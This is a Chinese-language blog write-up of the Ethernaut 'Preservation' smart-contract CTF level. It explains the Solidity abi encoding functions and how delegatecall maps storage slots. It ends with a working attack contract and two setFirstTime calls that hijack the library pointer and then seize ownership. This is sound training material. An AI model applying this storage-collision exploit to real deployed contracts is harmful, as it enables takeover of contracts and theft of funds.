---
title: Ethernaut - Preservation
categories: [Ethernaut]
tags: [以太坊, 智能合约, Ethernaut]
date: 2024-12-23
---

核心是里用 delegatecall 来进行攻击。

首先需要补充一下 abi 的各个函数的作用。

<!--more-->

# abi模块

图片中列出的 `abi` 模块的方法是 Solidity 和 EVM 编码中常用的方法，主要用于对数据的编码和解码。以下是它们的作用解释：

### 1. **`abi.decode`**

- **作用**: 用于解码通过 ABI 编码的字节数据。

- **签名**: `decode(bytes encodedData, (...)) returns (...)`

- **使用场景**: 如果你从合约中获取了编码的字节数据（如 `bytes` 类型），你可以用 `abi.decode` 来还原它为原始的数据类型。

- 示例:

    ```solidity
    bytes memory data = abi.encode("Hello", 123);
    (string memory str, uint256 num) = abi.decode(data, (string, uint256));
    ```

------

### 2. **`abi.encode`**

- **作用**: 对数据进行 ABI 编码，返回一个字节数组。

- **签名**: `encode(...) returns (bytes)`

- **使用场景**: 在 Solidity 中生成适合合约交互的输入数据，或创建自定义的数据格式。

- 示例:

    ```solidity
    bytes memory data = abi.encode("Hello", 123);
    // data 包含两个参数编码后的字节数据
    ```

------

### 3. **`abi.encodeCall`**

- **作用**: 对函数调用进行编码，包含函数选择器和参数。

- **签名**: `encodeCall(function, (...)) returns (bytes)`

- **使用场景**: 用于准备合约方法调用的字节数据，适合低层次合约调用（如 `call`）。

- 示例:

    ```solidity
    bytes memory data = abi.encodeCall(myContract.myFunction, (arg1, arg2));
    ```

------

### 4. **`abi.encodePacked`**

- **作用**: 进行紧凑编码，不包含 32 字节对齐填充。

- **签名**: `encodePacked(...) returns (bytes)`

- **使用场景**: 用于生成哈希（如 `keccak256`）或减少存储占用，但需小心避免哈希碰撞。

- 示例:

    ```solidity
    bytes memory packed = abi.encodePacked("Hello", uint8(123));
    ```

------

### 5. **`abi.encodeWithSelector`**

- **作用**: 对函数选择器和参数进行编码，返回包含函数选择器的字节数据。

- **签名**: `encodeWithSelector(bytes4 selector, (...)) returns (bytes)`

- **使用场景**: 手动设置函数选择器并编码数据，用于合约交互。

- 示例:

    ```solidity
    bytes memory data = abi.encodeWithSelector(myContract.myFunction.selector, arg1, arg2);
    ```

------

### 6. **`abi.encodeWithSignature`**

- **作用**: 根据函数签名和参数进行编码，返回包含函数选择器的字节数据。

- **签名**: `encodeWithSignature(string signature, (...)) returns (bytes)`

- **使用场景**: 当函数签名已知时，用于生成与目标合约交互所需的编码数据。

- 示例:

    ```solidity
    bytes memory data = abi.encodeWithSignature("myFunction(uint256,string)", 123, "Hello");
    ```

------

### 区别总结：

| **函数**                  | **主要用途**                              | **是否包含函数选择器** |
| ------------------------- | ----------------------------------------- | ---------------------- |
| `abi.decode`              | 解码数据                                  | 不适用                 |
| `abi.encode`              | 标准 ABI 编码                             | 否                     |
| `abi.encodeCall`          | 函数调用编码（函数选择器 + 参数）         | 是                     |
| `abi.encodePacked`        | 紧凑编码（无 32 字节对齐）                | 否                     |
| `abi.encodeWithSelector`  | 自定义函数选择器编码（函数选择器 + 参数） | 是                     |
| `abi.encodeWithSignature` | 使用函数签名直接编码（函数选择器 + 参数） | 是                     |





# delegatecall如何对应存储？

delegatecall不是不会切换上下文嘛，就是如果调用的函数里设置了一个Storage，但是修改的是调用合约对应的Storage。我有个问题，比如目标函数里修改了storedTime这个Storage，调用函数怎么找到对应的Storage？



- Solidity 合约中的状态变量会映射到特定的存储槽（Storage Slots），这些存储槽是根据变量声明的顺序确定的。
- 当目标函数通过 delegatecall 被调用时，所有的存储访问（读或写）都会指向调用合约的存储槽，而不是目标合约的存储槽。



存储槽式通过偏移量来确定的。所以，delegatecall的目标合约，必须和调用合约的内存分布完全一致！



这个题的问题就找到了。

```solidity
contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}
```

然后调用两次 setFirstTime，第一次把timeZone1Library设置为攻击合约，第二次用攻击合约修改owner。

```js
await contract.setFirstTime(AttackContract.address)
await contract.setFirstTime(AttackContract.address)
```

